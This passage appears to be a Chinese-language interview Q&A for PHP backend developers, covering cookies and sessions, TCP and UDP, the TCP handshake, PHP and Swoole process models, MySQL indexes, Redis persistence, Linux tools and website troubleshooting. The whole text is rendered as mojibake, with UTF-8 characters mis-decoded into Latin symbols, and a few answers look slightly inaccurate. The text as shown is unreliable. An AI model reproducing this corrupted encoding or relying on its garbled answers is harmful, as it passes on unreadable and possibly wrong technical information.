æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œsession åˆ™æ˜¯å­˜å‚¨åœ¨æœåŠ¡ç«¯ã€‚ éšç§ç­–ç•¥ä¸åŒï¼šcookie å› ä¸ºå­˜å‚¨åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œæ‰€ä»¥å¯¹å®¢æˆ·ç«¯æ˜¯å¯è§çš„ï¼Œè€Œsession UDP å’ŒTCP çš„åŒºåˆ«UDP æ˜¯é¢å‘æŠ¥æ–‡çš„ã€ä¸å¯é çš„æ•°æ®æŠ¥åè®®ï¼ŒTCP æ˜¯é¢å‘è¿æ¥çš„ã€å¯é çš„æµåè®®ã€‚ TCP é¢å‘è¿æ¥; UDP ä¸éœ€è¦è¿æ¥ï¼Œå³å‘é€æ•°æ®ä¹‹å‰ä¸éœ€è¦å»ºç«‹è¿æ¥; TCPæä¾›å¯é çš„æœåŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡TCPè¿æ¥ä¼ é€çš„æ•°æ®ï¼Œæ— å·®é”™ï¼Œä¸ä¸¢å¤±ï¼Œä¸é‡å¤ï¼Œä¸”æŒ‰åºåˆ°è¾¾; UDPå°½æœ€å¤§åŠªåŠ›äº¤ä»˜ï¼Œå³ä¸ä¿ä¿è¯å¯é äº¤ä»˜ TCPé¢å‘å­—èŠ‚æµï¼Œå®é™…ä¸Šæ˜¯TCPæŠŠæ•°æ®çœ‹æˆä¸€è¿ä¸²æ— ç»“æ„çš„å­—èŠ‚æµ; UDPæ˜¯é¢å‘æŠ¥æ–‡çš„ï¼ŒUDPæ²¡æœ‰æ‹¥å¡æ§åˆ¶ï¼Œå› æ­¤ç½‘ç»œå‡ºç°æ‹¥å¡ä¸ä¼šä½¿æºä¸»æœºçš„å‘é€é€Ÿç‡é™ä½ æ¯ä¸€æ¡TCPè¿æ¥åªèƒ½æ˜¯ç‚¹åˆ°ç‚¹çš„;UDPæ”¯æŒä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ TCPé¦–éƒ¨å¼€é”€20å­—èŠ‚;UDPçš„é¦–éƒ¨å¼€é”€å°ï¼Œåªæœ‰8ä¸ªå­—èŠ‚ TCPçš„é€»è¾‘é€šä¿¡ä¿¡é“æ˜¯å…¨åŒå·¥çš„å¯é ä¿¡é“ï¼ŒUDPåˆ™æ˜¯ä¸å¯é ä¿¡é“ è¯´ä¸€è¯´TCP çš„â€œç²˜åŒ…â€é—®é¢˜ ç»“è®ºï¼šTCP çš„â€œç²˜åŒ…â€é—®é¢˜å…¶å®æ˜¯ä¸€ä¸ªä¼ªå‘½é¢˜ã€‚ æœåŠ¡ç«¯å»ºç«‹æœåŠ¡ï¼Œå®¢æˆ·ç«¯å‘èµ·è¿æ¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯æ¯æ¬¡sendï¼Œå®¢æˆ·ç«¯éƒ½èƒ½æ­£å¸¸recvï¼Œä½†åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„ä¸¤æ¬¡sendæˆ–è€…å¤šæ¬¡sendï¼Œå®¢æˆ·ç«¯å¯èƒ½åªæœ‰ä¸€æ¬¡recväº†ã€‚è¿™å°±å¯¼è‡´äº†æ‰€è°“çš„â€œç²˜åŒ…â€é—®é¢˜çš„äº§ç”Ÿã€‚ TCP åè®®çš„æœ¬è´¨æ˜¯æµåè®®ï¼Œå®ƒåªä¼šä¿è¯ä»¥ä»€ä¹ˆé¡ºåºå‘é€å­—èŠ‚ï¼Œæ¥å—æ–¹å°±ä¸€å®šèƒ½æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¥æ”¶åˆ°ï¼Œæ‰€ä»¥æ‰€è°“çš„ç²˜åŒ…é—®é¢˜ä¸åº”è¯¥æ˜¯ä¼ è¾“å±‚é¢çš„é—®é¢˜ï¼Œè€Œæ˜¯åº”ç”¨å±‚é¢çš„é—®é¢˜ã€‚ ç®€è¿°TCP ä¸‰æ¬¡æ¡æ‰‹æ¦‚å¿µï¼šæŒ‡åœ¨å‘é€æ•°æ®çš„å‡†å¤‡é˜¶æ®µï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´éœ€è¦ä¸‰æ¬¡äº¤äº’ã€‚ ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªSYNåŒ…ï¼Œå¹¶è¿›å…¥SYN_SENT çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡ç«¯ç¡®è®¤ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šå½“æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œæ­¤æ—¶è¦ç»™å®¢æˆ·ç«¯ä¸€ä¸ªç¡®è®¤ä¿¡æ¯ACKï¼ŒåŒæ—¶å‘é€SYNæŠ¥ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥ SYN_RECV çŠ¶æ€ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘çš„ACK + SYN åŒ…åï¼Œå‘æœåŠ¡å™¨å‘é€ACKï¼Œå‘é€å®Œæ¯•ä¹‹åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¿›å…¥TCP è¿æ¥æˆåŠŸçŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚ ä¸ºä»€ä¹ˆæ¡æ‰‹ä¸€å®šè¦ä¸‰æ¬¡ï¼Œä¸èƒ½ä¸¤æ¬¡å—ï¼Ÿ è¿™æ˜¯ä¸ºäº†é˜²æ­¢å·²ç»å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡çªç„¶åˆä¼ åˆ°Tcp æœåŠ¡å™¨ï¼Œé¿å…äº§ç”Ÿé”™è¯¯ã€‚ ç®€è¿°TCP å››æ¬¡æŒ¥æ‰‹æ¦‚å¿µï¼šæ‰€è°“å››æ¬¡æŒ¥æ‰‹å°±æ˜¯è¯´å…³é—­TCP è¿æ¥çš„è¿‡ç¨‹ï¼Œå½“æ–­å¼€ä¸€ä¸ªTCP è¿æ¥æ—¶ï¼Œéœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å…±å…±å‘é€å››ä¸ªåŒ…ç¡®è®¤ã€‚ ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªFINï¼Œç”¨æ¥å…³é—­å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„æ•°æ®ä¼ è¾“ï¼Œå®¢æˆ·ç«¯è¿›å…¥ fin_wait çŠ¶æ€ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°fin åï¼Œå‘é€ä¸€ä¸ªack ç»™å®¢æˆ·ç«¯ï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°åºå·+1ï¼ŒæœåŠ¡å™¨è¿›å…¥close_wait çŠ¶æ€ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡å™¨å‘é€ä¸€ä¸ªfin ç”¨æ¥å…³é—­æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„æ•°æ®ä¼ è¾“ï¼ŒæœåŠ¡å™¨è¿›å…¥ last_ack çŠ¶æ€ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°fin åï¼Œå®¢æˆ·ç«¯è¿›å…¥time_wait çŠ¶æ€ï¼Œæ¥ç€å‘é€ä¸€ä¸ªack ç»™æœåŠ¡å™¨ï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°åºå·+1ï¼ŒæœåŠ¡å™¨è¿›å…¥ closed çŠ¶æ€ï¼Œå®Œæˆå››æ¬¡æŒ¥æ‰‹ã€‚ å»ºç«‹socket éœ€è¦å“ªäº›æ­¥éª¤ åˆ›å»ºsocket ç»‘å®šsocket åˆ°æŒ‡å®šåœ°å€å’Œç«¯å£ å¼€å§‹ç›‘å¬è¿æ¥ è¯»å–å®¢æˆ·ç«¯è¾“å…¥ å…³é—­ socket ç®€è¿°ä»æµè§ˆå™¨è¾“å…¥ a.com å›è½¦ä¹‹åå‘ç”Ÿäº†ä»€ä¹ˆ DNS åŸŸåè§£æï¼Œå¯»æ‰¾å¯¹åº”çš„IP åœ°å€ æ ¹æ®è¿™ä¸ªIP æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å™¨ï¼Œå»ºç«‹TCP è¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ TCP å»ºè¿ä¹‹åï¼Œå‘èµ·HTTP è¯·æ±‚ æœåŠ¡å™¨å“åº” HTTP è¯·æ±‚ å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®è§£æå¹¶æ¸²æŸ“é¡µé¢ æœåŠ¡å™¨å…³é—­TCP è¿æ¥ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰ é•¿è¿æ¥ä¸çŸ­è¿æ¥çš„åŒºåˆ«çŸ­è¿æ¥ä¸ºæ¯ä¸€æ¬¡çš„æ•°æ®ä¼ è¾“å‡†å¤‡äº†ä¸€ä¸ªä¼ è¾“é€šé“ï¼Œè€Œé•¿è¿æ¥åˆ™æ˜¯å»ºç«‹ä¸€æ¡é€šé“ï¼Œå¹¶ä¸€ç›´ä¿æŒï¼Œæ¯ä¸€æ¬¡ä¼ è¾“æ—¶éƒ½ä¼šå¤ç”¨åŒä¸€æ¡è¿æ¥é€šé“ã€‚ WebsocketWebsocket æ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œè¿æ¥åˆšå¼€å§‹è¿˜æ˜¯HTTP åè®®ï¼Œç”±å®¢æˆ·ç«¯å‘èµ·ï¼Œç„¶ååˆ‡æ¢æˆWebsocket åè®®ã€‚ å®ƒçš„å­˜åœ¨ï¼Œç”±è½®è¯¢å˜æˆäº†å®¢æˆ·ç«¯å¯ä»¥ä¸»åŠ¨å‘æœåŠ¡ç«¯å‘é€æ¶ˆæ¯ã€‚ ä»€ä¹ˆæ˜¯è½®è¯¢ï¼Ÿ è½®è¯¢æ˜¯ä¸€ç§è·å–ä¿¡æ¯çš„æ–¹å¼ã€‚ PHPç¯‡å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’çš„åŒºåˆ«å€¼ä¼ é€’ï¼šä¼ é€’çš„æ˜¯å˜é‡åœ¨å†…å­˜ä¸­çš„å‰¯æœ¬ã€‚å¼•ç”¨ä¼ é€’ï¼šä¼ é€’çš„æ˜¯å˜é‡åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ unset å¹¶ä¸ä¼šçœŸæ­£æ„ä¹‰ä¸Šæ³¨é”€ä¸€ä¸ªå˜é‡ï¼Œè€Œæ˜¯åˆ‡æ–­äº†å˜é‡åå’Œå®é™…å€¼ä¹‹é—´çš„å…³ç³»ï¼Œå…¶å˜é‡åªè¦è¿˜è¢«å¼•ç”¨å°±è¿˜æ²¡æœ‰è¢«é‡Šæ”¾ã€‚ composer è‡ªåŠ¨åŠ è½½åŸç†composer çš„æ ¸å¿ƒåŠ è½½æ€æƒ³æ˜¯é€šè¿‡composer çš„autoload.phpï¼Œå°†ç±»å’Œè·¯å¾„çš„å¯¹åº”å…³ç³»åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæœ€åå°†å…·ä½“çš„åŠ è½½å®ç°æ³¨å†Œåˆ° spl_autoload_register å‡½æ•°ä¸­ã€‚ å¸¸ç”¨çš„è¯·æ±‚ç¬¬ä¸‰æ–¹æ¥å£æœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿ curl file_get_contents fopen æŠ½è±¡ç±»å’Œæ¥å£ç±»çš„åŒºåˆ«æŠ½è±¡ç”¨äºæè¿°ä¸åŒçš„äº‹ç‰©ï¼Œæ¥å£ç”¨äºæè¿°äº‹ç‰©çš„è¡Œä¸º è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«è¿›ç¨‹æ˜¯CPU åˆ†é…å†…å­˜çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯CPU è°ƒåº¦çš„æœ€å°å•ä½ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªçº¿ç¨‹åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹ã€‚ Swoole çš„è¿›ç¨‹æ¨¡å‹Swoole çš„è¿›ç¨‹æ¨¡å‹é‡‡ç”¨ä¸»è¿›ç¨‹ã€ç®¡ç†è¿›ç¨‹ã€å¼‚æ­¥ä»»åŠ¡/å·¥ä½œè¿›ç¨‹åä½œçš„æ–¹å¼ã€‚ Manager è¿›ç¨‹ä¸»è¦è´Ÿè´£åˆ›å»º/å›æ”¶ worker/task è¿›ç¨‹ Reactor è¿›ç¨‹ä¸»è¦è´Ÿè´£ç»´æŠ¤å®¢æˆ·ç«¯ TCP è¿æ¥ã€å¤„ç†ç½‘ç»œ IOã€å¤„ç†åè®®ã€æ”¶å‘æ•°æ® Worker/Task è¿›ç¨‹ä¸»è¦è´Ÿè´£æ‰§è¡ŒPHP ä»£ç ã€‚ PHP çš„è¿›ç¨‹æ¨¡å‹åœ¨LNMP çš„æ¨¡å¼ä¸‹ï¼ŒPHP æ˜¯php-fpm å¤šè¿›ç¨‹+é˜»å¡I/O çš„è¿›ç¨‹æ¨¡å‹ã€‚ åŒæ­¥ã€å¼‚æ­¥ã€é˜»å¡ã€éé˜»å¡æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿ åŒæ­¥å’Œå¼‚æ­¥æ˜¯ä¸€ç§æ¶ˆæ¯é€šä¿¡æœºåˆ¶ã€‚ é˜»å¡å’Œéé˜»å¡æ˜¯ä¸€ç§ä¸šåŠ¡æµç¨‹å¤„ç†æ–¹å¼ã€‚ IO å¤šè·¯å¤ç”¨ï¼šç”¨ä¸€ä¸ªçº¿ç¨‹æ¥æ£€æŸ¥Socket çš„å°±ç»ªçŠ¶æ€ã€‚ å¹¶å‘ã€å¹¶è¡Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå¹¶å‘ï¼šä¸¤ä»¶æˆ–è€…å¤šä»¶äº‹æƒ…åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿå¹¶è¡Œï¼šä¸¤ä»¶æˆ–è€…å¤šä»¶äº‹æƒ…åœ¨åŒä¸€æ—¶åˆ»å‘ç”Ÿ åŒºåˆ«åœ¨ä¸ï¼šåœ¨åŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¯¹äºå¹¶è¡Œæ¥è¯´ï¼Œäº‹ä»¶æ˜¯ä¸€å¹¶å‘ç”Ÿï¼Œè€Œå¯¹äºå¹¶å‘æ¥è¯´ï¼Œåœ¨å®è§‚çœ‹æ¥ä¹Ÿæ˜¯ä¸€å¹¶å‘ç”Ÿï¼Œä½†åœ¨å¾®è§‚ä¸Šå´æ˜¯äº¤æ›¿å‘ç”Ÿã€‚ ç®€è¿°PHP ä»£ç è§£æè¿‡ç¨‹Zend å¼•æ“é¦–å…ˆä¼šå°†PHP ä»£ç è¿›è¡Œè§£æï¼ˆè¯æ³•ã€è¯­æ³•è§£æï¼‰æˆ opcodeï¼Œç„¶åZend è™šæ‹Ÿæœºä¼šé¡ºåºæ‰§è¡Œè¿™äº›æŒ‡ä»¤ã€‚ ä»LNMP çš„è§’åº¦ç®€è¿°ä¸€æ¬¡å®Œæ•´çš„è¯·æ±‚è¿‡ç¨‹å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼ŒWeb Server é¦–å…ˆä¼šåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯é™æ€è¿˜æ˜¯åŠ¨æ€ï¼Ÿå¦‚æœæ˜¯é™æ€ï¼Œç›´æ¥è¿”å›å¯¹åº”çš„é™æ€èµ„æºã€‚å¦‚æœæ˜¯åŠ¨æ€ï¼ŒFastCGI ä¼šå°†è¯¥è¯·æ±‚è½¬å‘ç»™æœ¬åœ° 9000 ç«¯å£ï¼ˆ9000 æ˜¯ PHPâ€”FPM æ‰€ç›‘å¬çš„ç«¯å£ï¼‰ï¼ŒPHP-FPM ä¸»è¿›ç¨‹æ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¼šåˆ†é…ä¸€ä¸ªç©ºé—²çš„ Worker è¿›ç¨‹å»å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå¤„ç†å®Œæˆä¹‹åå°†æ•°æ®è¿”å›ç»™ FastCGIï¼Œå†ç”± Nginx è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ PHP å¯ä»¥åšå¸¸é©»å†…å­˜å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿä¼ ç»Ÿçš„PHP æ— æ³•ä»¥å¸¸é©»å†…å­˜çš„æ–¹å¼è¿è¡Œï¼Œè¿™æ˜¯å› ä¸ºPHPæ˜¯è§£é‡Šå‹è„šæœ¬è¯­è¨€ï¼Œè¿™ç§è¿è¡Œæœºåˆ¶ä½¿å¾—æ¯ä¸ªPHP é¡µé¢è§£é‡Šæ‰§è¡Œåï¼Œæ‰€æœ‰èµ„æºéƒ½è¢«å›æ”¶äº†ã€‚ é€šå¸¸å¦‚ä½•å®ç°ç”¨æˆ·ç™»å½•ï¼ˆAPIï¼‰æœ‰ä¸¤ç§æ–¹å¼ï¼šä¸€ç§æ˜¯æ™®é€šçš„ token ä»¤ç‰Œï¼Œå¦ä¸€ç§åˆ™æ˜¯JWTã€‚ æ™®é€šTokenï¼šç”¨æˆ·åˆæ¬¡ç™»å½•ä¼šæºå¸¦ç”¨æˆ·åå’Œå¯†ç ç­‰ä¿¡æ¯ï¼ŒæœåŠ¡ç«¯éªŒè¯é€šè¿‡ä¹‹åï¼Œä¼šç»™å®¢æˆ·ç«¯è¿”å›ä¸€ä¸ªTokenã€‚è¿™ä¸ªToken å¯ä»¥æ˜¯ç”±ç”¨æˆ·åã€å¯†ç ã€ç™»å½•è®¾å¤‡ã€ç™»å½•IP ç­‰ä¿¡æ¯åŠ å¯†ä¹‹åç»„æˆï¼Œä»¥åçš„å®¢æˆ·ç«¯æ¯ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šæºå¸¦è¿™ä¸ªTokenï¼ŒæœåŠ¡ç«¯åˆ™ä¼šéªŒè¯è¯¥Tokenã€‚ åœ¨PHPä¸­ï¼Œä½ æ˜¯å¦‚ä½•æ•è·å¼‚å¸¸çš„ï¼Ÿå°½é‡é¿å…ä½¿ç”¨exitã€dieæ–¹æ³•ç›´æ¥é€€å‡ºï¼Œè€Œä½¿ç”¨try...catchæ¥æ•è·å¼‚å¸¸ã€‚ å¸¸è§è®¾è®¡æ¨¡å¼åˆ›é€ å‹ï¼šå·¥å‚æ¨¡å¼ã€å•ä¾‹æ¨¡å¼ã€åŸå‹æ¨¡å¼ç»“æ„å‹ï¼šé€‚é…å™¨æ¨¡å¼ã€è£…é¥°æ¨¡å¼ã€é—¨é¢æ¨¡å¼ã€ä»£ç†æ¨¡å¼è¡Œä¸ºå‹ï¼šè¿­ä»£å™¨æ¨¡å¼ã€ä¸­ä»‹æ¨¡å¼ã€è§‚å¯Ÿè€…æ¨¡å¼ ä»€ä¹ˆæ˜¯ä¾èµ–æ³¨å…¥ä¾èµ–æ³¨å…¥ä¸»è¦ç”¨æ¥å‡å°‘ä»£ç é—´çš„è€¦åˆï¼Œæœ‰æ•ˆåˆ†ç¦»å¯¹è±¡å’Œå®ƒæ‰€éœ€è¦çš„å¤–éƒ¨èµ„æºã€‚ Mysqlç¯‡Mysql çš„InnoDb å’ŒMyISAM å¼•æ“æœ‰ä½•ä¸åŒï¼Ÿ InnoDb çš„ç‰¹ç‚¹åŒ…æ‹¬ï¼šäº‹åŠ¡ã€é” InnoDb æ”¯æŒ ACID çš„äº‹åŠ¡ 4ä¸ªç‰¹æ€§ï¼ŒMyISAM ä¸æ”¯æŒäº‹åŠ¡ã€‚ InnoDB æ”¯æŒè¡Œçº§åˆ«çš„é”ç²’åº¦ï¼ŒMyISAM ä¸æ”¯æŒï¼Œåªæ”¯æŒè¡¨çº§åˆ«çš„é”ç²’åº¦ã€‚ ä»€ä¹ˆæ˜¯ACIDï¼ˆäº‹åŠ¡çš„å››ä¸ªç‰¹æ€§ï¼‰ï¼Ÿ åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆï¼Œä¸ä¼šç»“æŸåœ¨æŸä¸ªä¸­é—´ç¯èŠ‚ã€‚ ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä¹‹åï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§é™åˆ¶æœªè¢«ç ´åã€‚ éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šä¸¤ä¸ªæˆ–è€…å¤šä¸ªäº‹åŠ¡çš„æ‰§è¡Œæ˜¯äº’ä¸å¹²æ‰°çš„ï¼Œä¸€ä¸ªäº‹åŠ¡ä¸å¯èƒ½çœ‹åˆ°å…¶ä»–äº‹åŠ¡è¿è¡Œæ—¶ï¼Œä¸­é—´æŸä¸€æ—¶åˆ»çš„æ•°æ®ã€‚ æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡å®Œæˆä¹‹åï¼Œäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹è¿›è¡ŒæŒä¹…åŒ–ä¿å­˜ï¼Œä¸ä¼šä¸¢å¤±ã€‚ Mysql æœ‰å‡ ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Ÿæœ‰å››ç§éš”ç¦»çº§åˆ«ã€‚ æ­»é”æ˜¯ä»€ä¹ˆï¼Ÿä¸¤ä¸ªæˆ–å¤šä¸ªäº‹åŠ¡åœ¨åŒä¸€ä¸ªèµ„æºä¸Šç›¸äº’å ç”¨ã€‚ ç®€è¿°Mysql ç´¢å¼•ã€ä¸»é”®åŠå…¶å¸¸è§ç´¢å¼•ç´¢å¼•å°±æ˜¯ç±»ä¼¼äºä¹¦ç±ç›®å½•çš„å­˜åœ¨ï¼Œä¸»é”®æ˜¯ç”¨äºç¡®å®šå­—æ®µçš„å”¯ä¸€æ€§ã€‚ æ™®é€šç´¢å¼•ï¼šæœ€æ™®é€šçš„ç´¢å¼•ï¼Œä½¿ç”¨æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ã€‚ å”¯ä¸€ç´¢å¼•ï¼šä¸æ™®é€šç´¢å¼•ç±»å‹ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œåˆ—å€¼ä¸å…è®¸é‡å¤ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ã€‚ ä¸»é”®ç´¢å¼•ï¼šä¸»é”®æœ¬èº«è‡ªå¸¦çš„ç´¢å¼•ï¼Œä¸å…è®¸æœ‰ç©ºå€¼ã€‚ å…¨æ–‡ç´¢å¼•ï¼šä»…å¯ç”¨äº MyISAM è¡¨ï¼Œé’ˆå¯¹è¾ƒå¤§çš„æ•°æ®ï¼Œç”Ÿæˆå…¨æ–‡ç´¢å¼•å¾ˆè€—æ—¶å ç©ºé—´ ç»„åˆç´¢å¼•ï¼šä¸ºäº†æé«˜å¤šæ¡ä»¶æŸ¥è¯¢æ•ˆç‡ï¼Œå¯å»ºç«‹ç»„åˆç´¢å¼•ï¼Œéµå¾ªâ€æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™â€ ä½†æ˜¯ç´¢å¼•ä¹Ÿä¸æ˜¯è¶Šå¤šè¶Šå¥½ï¼Œç´¢å¼•åŠ å¿«äº†æŸ¥è¯¢é€Ÿåº¦ï¼Œä½†åŒæ—¶ä¹Ÿä¼šå½±å“æ›´æ–°é€Ÿåº¦ã€‚ Redisç¯‡Redis å’ŒMemcache çš„åŒºåˆ« Redis æ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼ŒMemcache åªæ”¯æŒKey-Value Redis æ”¯æŒä¸¤ç§æŒä¹…åŒ–ï¼ŒMemcache ä¸æ”¯æŒæŒä¹…åŒ–ã€‚ Redis çš„å¸¸è§æ•°æ®ç»“æ„åŠå…¶åº”ç”¨åœºæ™¯ å­—ç¬¦ä¸² å“ˆå¸Œ åˆ—è¡¨ æ— åºåˆ—è¡¨ é›†åˆ Redis çš„æŒä¹…åŒ–æœ‰å‡ ç§æ–¹æ¡ˆï¼Ÿæœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯ï¼šRDBã€AOFã€æ··åˆã€‚ RDBï¼šå°†æŸä¸€æ—¶åˆ»çš„æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥åˆ°ç£ç›˜é‡Œï¼ŒæœåŠ¡é‡å¯æ—¶æ£€æµ‹åˆ°å¯¹åº”æ–‡ä»¶è‡ªåŠ¨åŠ è½½è¿›è¡Œæ•°æ®æ¢å¤ï¼Œæœ‰æ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ä¸¤ç§æœºåˆ¶ã€‚ AOFï¼šä»¥æ–‡ä»¶è¿½åŠ çš„æ–¹å¼å†™å…¥å®¢æˆ·ç«¯æ‰§è¡Œçš„å†™å‘½ä»¤ï¼Œæ•°æ®æ¢å¤æ—¶ï¼Œé€šè¿‡åˆ›å»ºä¼ªå®¢æˆ·ç«¯çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œç›´åˆ°æ¢å¤å®Œæˆã€‚ æ··åˆï¼šåœ¨å†™å…¥çš„æ—¶å€™å…ˆæŠŠæ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„å†™å‘½ä»¤ä»¥ AOF çš„æ ¼å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ ä¸ºä»€ä¹ˆRedis æ˜¯å•çº¿ç¨‹ï¼ŸLinuxç¯‡è¯´ä¸€ä¸‹ä½ å¸¸ç”¨çš„Linux å‘½ä»¤ï¼ˆæœ€åŸºç¡€çš„ä¸ç”¨è¯´ï¼‰ ç½‘ç»œï¼špingã€tcppingã€telnetã€netstatã€nmapã€lsofã€tcpdump ç£ç›˜ï¼šdfã€du è¿›ç¨‹ï¼špsã€pstree å†…å­˜ï¼šfree è´Ÿè½½ï¼štop å‹æµ‹å·¥å…·ï¼šabã€wrk æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½ï¼šcurlã€wgetã€scp ç»¼åˆï¼šglances åŸºæœ¬çš„è¿ç»´éœ€è¦ç›‘æ§å“ªäº›æ•°æ®ï¼Ÿ ç³»ç»Ÿå±‚ï¼šCPUã€å†…å­˜ã€è´Ÿè´£ã€ç½‘å¡ã€I/O åº”ç”¨å±‚ï¼šQPSã€APIå“åº”æ—¶é•¿ã€Rediså†…å­˜ä½¿ç”¨é‡ã€ä»»åŠ¡é˜Ÿåˆ—æ•°ã€php-fpm è¿›ç¨‹æ•°ã€Mysqlçº¿ç¨‹æ•° å¥åº·å·¡æŸ¥ï¼šdns è§£æã€ip æ˜¯å¦å¯ä»¥è®¿é—®ã€ç¡¬ç›˜ã€å„ç§åŸºç¡€æœåŠ¡ å…¶ä»–è¯´ä¸€è¯´ä½ æ‰€çŸ¥é“çš„ç½‘ç«™æ”»å‡»æ–¹å¼åŠå¦‚ä½•é˜²èŒƒ CSRF è·¨ç«™ä¼ªé€ è¯·æ±‚ XSS è·¨ç«™è„šæœ¬æ”»å‡» SQL æ³¨å…¥ DDOS æ”»å‡» å¦‚æœç”¨æˆ·åé¦ˆç½‘ç«™æ…¢ï¼Œä½ ä¼šæ€æ ·åšï¼Ÿ èµ„æºåŠ è½½æ…¢i. WebServer é…ç½®é™æ€èµ„æºç¼“å­˜ã€åŠ¨é™åˆ†ç¦»ii. DNS ç¼“å­˜ã€CDN åŠ é€Ÿiii. å¢åŠ æœåŠ¡å™¨å¸¦å®½ SQL æŸ¥è¯¢æ…¢i. Mysql æ…¢æŸ¥è¯¢æ‰¾å‡ºè€—æ—¶SQLii. Explain åˆ†æè€—æ—¶åŸå› iii. ä¼˜åŒ–SQL å¹¶å‘i. ä¼˜åŒ–PHP-FPM é…ç½® å¦‚æœä½ å‘ç°ä½ éƒ¨ç½²çš„ç½‘ç«™æ‰“ä¸å¼€äº†ï¼Œä½ ä¼šå¦‚ä½•æ’æŸ¥ï¼Ÿ é¦–å…ˆæ£€æŸ¥DNS è§£æi. æ£€æŸ¥åŸŸåè§£æii. æ’é™¤æµè§ˆå™¨ç¼“å­˜ æ£€æŸ¥é˜²ç«å¢™i. é˜²ç«å¢™æ˜¯å¦å¼€å¯ï¼Ÿii. ç«¯å£æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œé€šå¸¸ä½¿ç”¨telnet å‘½ä»¤æ£€æŸ¥ æ ¹æ®ç½‘ç«™è¿”å›çŠ¶æ€ç ï¼Œå…·ä½“åˆ†æi. 